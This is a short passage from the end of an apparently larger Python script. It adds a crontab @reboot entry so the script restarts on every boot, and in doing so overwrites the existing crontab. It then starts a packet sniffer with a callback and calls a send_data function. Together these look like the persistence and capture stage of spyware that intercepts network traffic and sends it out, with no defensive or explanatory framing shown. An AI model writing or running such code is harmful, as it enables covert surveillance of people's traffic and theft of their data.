            service_name = "monitor"
            service_command = f'echo "@reboot {os.path.abspath(__file__)}" | crontab -'
            subprocess.run(service_command, shell=True)
    
    create_persistence()
    sniff(prn=packet_callback, store=0)
    send_data()

